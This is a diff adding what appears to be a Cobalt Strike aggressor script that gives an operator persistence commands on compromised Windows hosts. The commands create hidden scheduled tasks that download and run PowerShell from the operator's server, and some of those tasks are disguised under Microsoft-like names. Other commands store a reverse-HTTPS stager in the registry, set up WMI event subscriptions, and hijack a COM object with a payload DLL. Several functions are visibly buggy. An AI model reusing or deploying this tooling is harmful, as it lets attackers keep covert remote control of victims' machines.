@@ -1,0 +1,230 @@
+
+global('%bvars');
+
+# request environment variables for every new Beacon that comes in.
+on beacon_initial {
+
+        #bshell($1, "set");
+	#bsleep($1,0);
+}
+
+# parse environment vars from beacon output
+on beacon_output {
+        # do nothing if we already know the env variables
+        if ($1 in %bvars) {
+                return;
+        }
+        # verify this is output for the set command
+        else if ("*APPDATA=*" iswm $2) {
+                local('$temp $key $value');
+                foreach $temp (split("\r\n", $2)) {
+                        if ($temp ismatch '(.*?)=(.*)') {
+                                ($key, $value) = matched();
+                                %bvars[$1][$key] = $value;
+                        }
+                }
+        }
+}
+
+# the long way
+sub randomString {
+        local('$alpha $res $x $size');
+        $size = $1;
+        $alpha  = "abcdefghijklmnopqrstuvwxyz";
+        $alpha .= lc($alpha);
+        $alpha  = split("", $alpha);
+        for ($x = 0; $x <= ($size); $x++) {
+                $res .= rand($alpha);
+        }
+        return "$res";
+}
+
+alias addschtaskOnidle {
+
+	@tasknamelist = pref_get_list("taskname.list");
+	$taskname = @tasknamelist[rand(size(@tasknamelist))];
+
+	%site = getSiteURL();
+
+	$extip = %site['Host'];
+	$port = %site['Port'];
+	$uri = %site['URI'];
+
+	$schtask = "schtasks /create /tn $taskname /tr \"c:\\windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://" . $extip . ": $+ $port $+ $uri $+ '''))'\" /sc onidle /i 30 /f";
+	bshell($1,$schtask);
+	blog($1,"Schtask Onidle dropped..");
+}
+
+alias schtasksclean {
+	@tasknames = pref_get_list("tasknames.list");
+
+	foreach $taskname (@tasknamelist) {
+		bshell($1,"schtasks /delete /tn $task /f");
+	}
+}
+
+alias addRegdebug {
+
+	local('$hive $payload $regpath $name');
+
+	$shellcode  = shellcode("revhttps", false);
+        $payload = powershell_encode_stager($shellcode);
+
+	$hive = "HKCU";
+	$regpath = "\\Software\\Microsoft\\Windows\\";
+        $name = "debug";
+
+        # add the key
+        addRegKey($1,$hive,$regpath,$name,$payload);
+
+	 #bpowershell($1,"Set-ItemProperty -Path 'HKLM:\HARDWARE' -Name 'arse' -Value $backdoor -Force");
+
+	# fix this line ..
+	# set this to run from wscript silent mode ?
+        bpowershell($1,"schtasks /F /create /tn TEST /tr \"powershell -c 'IEX (gp HKLM:Hardware\ arse').arse'\" /sc onlogon /ru SYSTEM");
+
+
+}
+
+
+
+
+
+
+sub isAdmin {
+    return iff( right(beacon_info($1, "user"), 2) eq " *" , true, false);
+}
+
+sub addRegKey {
+	local('$beacon $hive $keyPath $keyName $regPayload');
+	println ("$beacon $hive $keyPath $keyName $regPayload");
+	#$powershell = "New-ItemProperty -Force -Path \" $+ $2 $+ : $+ $3 $+ \" -Name \" $+ $4 $+ \" -Value \" $+ $5 $+ \"";
+	$powershell = "New-ItemProperty -Force -Path \" $+ $2 $+ : $+ $3 $+ \" -Name \" $+ $4 $+ \" -PropertyType String -Value \" $+ $5 $+ \"";
+	bpowershell($1,$powershell);
+}
+
+sub remRegKey {
+    $powershell = "Remove-ItemProperty -Path " . $hive . ":" . $keyPath . " -Name " . $keyName;
+    bpowershell($1, $powershell);
+}
+
+
+sub getSiteURL {
+
+    foreach $site (sites()) {
+       if ($site['Description'] eq "Scripted Web Delivery (powershell)"){
+	   return $site;
+       } 
+	   
+    }
+	berror($1,"no web delivery started");
+} 
+
+
+alias addWMIDaily {
+
+	    if(isAdmin($1)) {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+            $payloadPath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        $powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $taskName ."';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 02 AND TargetInstance.Minute = 00 GROUP WITHIN 30\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $taskName . "';ExecutablePath='" . $payloadPath ."';CommandLineTemplate ='" . $payloadPath . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
+
+        bpowershell($1,$powershellcmd);
+
+	} else {
+		blog($1,"Admin privs needed");
+	}
+}
+
+
+alias addWMIOnStart {
+            $payloadName = "onstart";
+            $taskName = "onstart";
+            $payloadPath = "C:\\Users\\Public\\a.txt";
+        $powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $taskName ."';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $taskName . "';ExecutablePath='" . $payloadPath ."';CommandLineTemplate ='cmd /k < " . $payloadPath . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
+
+        bpowershell($1,$powershellcmd);
+}
+
+alias remWMIOnStart {
+            $payloadName = "a.txt";
+            $taskName = "onstart";
+            $payloadPath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        $powershellcmd = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='" . $taskName . "'\"| Remove-WmiObject;Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='" . $taskName . "'\" | Remove-WmiObject; Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { \$_.filter -match '" . $taskName . "'} | Remove-WmiObject;";
+        bpowershell($1,$powershellcmd);
+}
+
+
+
+
+
+
+alias com-hijack {
+
+        $appdata = %bvars[$1]["APPDATA"];
+
+
+	$s = rString(4);
+	$hijackdll = "api-ms-win-downlevel- $+ $s $+ -l1-1-0._dl";
+
+
+	$dllpath = "$appdata\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\$hijackdll";
+
+	bshell($1,"mkdir $appdata\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\");
+	bcd($1,"$appdata\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\");
+
+	$data = artifact("revhttps","dll");
+
+	$reg32 = "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7\}\\InprocServer32 /ve /d \" $+ $dllpath $+ \"";
+	
+	$reg64 = 'HKCU\Software\Classes\Wow6432Node\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E }\InprocServer32 /ve /d "$dllpath"';
+	
+	bshell($1,"reg add $reg32 /f");
+	bshell($1,"reg add $reg64 /f");
+}
+
+alias dropschtask {
+        local('$is64');
+
+        if ($2 is $null) {
+                berror($1,"need a time param");
+		return;
+        } else {
+
+        $host = listener_info("revhttps","host");
+        $is64 = binfo($1,'is64');
+
+        if($is64 == 1) { 
+                $schtask = "schtasks /F /create /RU SYSTEM /SC daily /ST " . $2 .":00:00". " /tn \"Microsoft\\windows\\Application Experience\\SystemExp\" /tr \"c:\\windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://" . $host . ":80/CentraStageUpdate'''))'\"";
+        } else {
+                $schtask = "schtasks /F /create  /RU SYSTEM /SC daily /ST " . $2 . ":00:00" . " /tn \"Microsoft\\windows\\Application Experience\\SystemExp\" /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://" . $host . ":80/CentraStageUpdate'''))'\"";
+
+        }
+        blog($1,"Adding schtask to system");
+        bshell ($1,$schtask);
+        #blog($1,$schtask);
+        }
+}
+
+
+
+sub rString {
+
+        local('$alpha $res $x $size');
+
+        $size = $1;
+
+        $alpha  = "abcdefghijklmnopqrstuvwxyz";
+        $alpha .= lc($alpha);
+        $alpha  = split("", $alpha);
+        for ($x = 0; $x <= ($size); $x++) {
+                $res .= rand($alpha);
+        }
+        return "$res";
+}
+
+
+
+
+
+
